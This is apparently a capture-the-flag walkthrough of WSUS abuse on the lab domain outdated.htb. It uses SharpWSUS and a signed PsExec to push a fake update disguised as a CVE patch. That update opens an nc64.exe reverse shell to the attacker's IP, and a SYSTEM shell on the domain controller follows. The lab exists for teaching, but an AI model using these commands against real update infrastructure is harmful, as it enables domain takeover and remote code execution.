## # `WSUS` -

Windows Server Update Services(WSUS) is a Microsoft solution for administrators to deploy Microsoft product updates and patches across an environment in a scalable manner, using a method where the internal servers do not need to reach out to the internet directly. WSUS is extremely common within Windows corporate environments.

[SharpWSUS post](https://labs.nettitude.com/blog/introducing-sharpwsus/) 

Download [Sharp Wsus](https://github.com/nettitude/SharpWSUS) 

Build in Visual Studio, and upload to DC :

```bash
*Evil-WinRM* PS C:\programdata> upload SharpWSUS.exe sw.exe
Info: Uploading SharpWSUS.exe to sw.exe

                                                             
Data: 65536 bytes of 65536 bytes copied

Info: Upload successful!
```

#### ## <mark style="background: #3D7EFFA6;">Identify WSUS</mark> -

The registry key `HKLM:\software\policies\microsoft\windows\WindowsUpdate` will show the WSUS server in use. From client :

```powershell
PS C:\> Get-ItemProperty HKLM:\software\policies\microsoft\windows\WindowsUpdate

AcceptTrustedPublisherCerts                  : 1
ExcludeWUDriversInQualityUpdate              : 1
DoNotConnectToWindowsUpdateInternetLocations : 1
WUServer                                     : http://wsus.outdated.htb:8530
WUStatusServer                               : http://wsus.outdated.htb:8530
UpdateServiceUrlAlternate                    : 
PSPath                                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies
                                               \microsoft\windows\WindowsUpdate
PSParentPath                                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies
                                               \microsoft\windows
PSChildName                                  : WindowsUpdate
PSDrive                                      : HKLM
PSProvider                                   : Microsoft.PowerShell.Core\Registry
```

`SharpWSUS.exe` will do this as well :

```powershell
*Evil-WinRM* PS C:\programdata> .\sw.exe locate

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Locate WSUS Server
WSUS Server: http://wsus.outdated.htb:8530

[*] Locate complete
```

#### ## <mark style="background: #3D7EFFA6;">WSUS Information</mark> -

`SharpWSUS.exe` will also give information about the clients using the WSUS :

```powershell
*Evil-WinRM* PS C:\programdata> .\sw.exe inspect

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Inspect WSUS Server

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent


####################### Computer Enumeration #######################
ComputerName, IPAddress, OSVersion, LastCheckInTime
---------------------------------------------------
dc.outdated.htb, 172.16.20.1, 10.0.17763.652, 7/22/2022 5:01:44 AM

####################### Downstream Server Enumeration #######################
ComputerName, OSVersion, LastCheckInTime
---------------------------------------------------

####################### Group Enumeration #######################
GroupName
---------------------------------------------------
All Computers
Downstream Servers
Unassigned Computers

[*] Inspect complete
```

It only shows the DC.

#### ## <mark style="background: #3D7EFFA6;">Exploit</mark> -

WSUS will only run signed Microsoft binaries. As you have no good way to get a MS signing certificate, You’ll have to use something legit. The article suggests the Sysintenals tool, [PSExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Download [Sysinternals](https://download.sysinternals.com/files/SysinternalsSuite.zip), copy `PsExec.exe` to your webserver, and upload it :

```powershell
*Evil-WinRM* PS C:\programdata> upload PsExec64.exe \programdata\ps.exe
Info: Uploading PsExec64.exe to \programdata\ps.exe
                                                             
Data: 685960 bytes of 685960 bytes copied

Info: Upload successful!
```

#### ## <mark style="background: #3D7EFFA6;">Create/Approve Update</mark> -

Create an update using `SharpWSUS.exe`. The blog post shows adding an administrator, but I’ll just go for a reverse shell using `nc64.exe`. The `/args` for [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) are `-accepteula` so that it doesn’t pop a box and wait for a click, `-s` to run as system, and `-d` to return immediately. The `/title` is arbitrary :

```powershell
*Evil-WinRM* PS C:\programdata> .\sw.exe create /payload:"C:\programdata\ps.exe" /args:" -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445" /title:"CVE-2022-30190"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Create Update
[*] Creating patch to use the following:
[*] Payload: ps.exe
[*] Payload Path: C:\programdata\ps.exe
[*] Arguments:  -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445
[*] Arguments (HTML Encoded):  -accepteula -s -d c:\programdata\nc64.exe -e cmd.exe 10.10.14.6 445

################# WSUS Server Enumeration via SQL ##################
ServerName, WSUSPortNumber, WSUSContentLocation
-----------------------------------------------
DC, 8530, c:\WSUS\WsusContent

ImportUpdate
Update Revision ID: 44
PrepareXMLtoClient
InjectURL2Download
DeploymentRevision
PrepareBundle
PrepareBundle Revision ID: 45
PrepareXMLBundletoClient
DeploymentRevision

[*] Update created - When ready to deploy use the following command:
[*] SharpWSUS.exe approve /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:Target.FQDN /groupname:"Group Name"

[*] To check on the update status use the following command:
[*] SharpWSUS.exe check /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:Target.FQDN

[*] To delete the update use the following command:
[*] SharpWSUS.exe delete /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:Target.FQDN /groupname:"Group Name"

[*] Create complete
```

You need to approve that Update, using the syntax given in the output (`/groupname` is arbitrary) :

```powershell
*Evil-WinRM* PS C:\programdata> .\sw.exe approve /updateid:ea097920-0e17-4f9e-8045-0dfc5078a317 /computername:dc.outdated.htb /groupname:"CriticalPatches"

 ____  _                   __        ______  _   _ ____
/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
 ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
                       |_|
           Phil Keeble @ Nettitude Red Team

[*] Action: Approve Update

Targeting dc.outdated.htb
TargetComputer, ComputerID, TargetID
------------------------------------
dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
Group Exists = False
Group Created: CriticalPatches
Added Computer To Group
Approved Update

[*] Approve complete
```

It takes about a minute for this to fire, and it fails occasionally. If it fails, I’ll try again, but eventually there’s a connection at `nc` :

```bash
napster@hacky$ rlwrap -cAr nc -lnvp 445
Listening on 0.0.0.0 445
Connection received on 10.10.10.10 49944
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

